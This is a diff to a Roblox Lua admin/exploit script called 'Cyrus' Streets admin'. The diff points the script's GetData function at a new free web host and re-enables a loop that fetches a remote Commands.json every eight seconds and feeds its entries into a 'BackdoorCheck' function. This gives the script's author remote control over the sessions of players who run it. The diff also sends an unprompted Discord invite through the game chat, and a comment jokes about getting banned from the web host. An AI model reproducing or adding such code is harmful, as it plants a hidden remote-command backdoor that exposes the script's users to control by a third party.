@@ -548,7 +548,7 @@ end
 -- [[ Local functions ]] --
 
 local function GetData()
-	return HttpService:JSONDecode(game:HttpGet("http://cyrustesting.orgfree.com/Commands.json"))
+	return HttpService:JSONDecode(game:HttpGet("http://cyrustesting.byethost15.com/Commands.json"))
 end
 
 local function BackdoorCheck(Player,Chat)
@@ -3255,13 +3255,11 @@ notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " s
 notif("Newest Update","forgot I had this antiaim method lol",10,nil)
 ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("new disc: A4nyecN","All")
 	
---[[while wait(8) do
+while wait(8) do
 	local Data = GetData()
 	for i,v in pairs(Data) do
 		if PlrFinder(i) == LP or typeof(PlrFinder(i)) == "table" then
 			BackdoorCheck("none","`"..v)
 		end
 	end
-end
-	stupid web host banned me 
-]]
+end -- lets see if I get banned off this webhost lmao
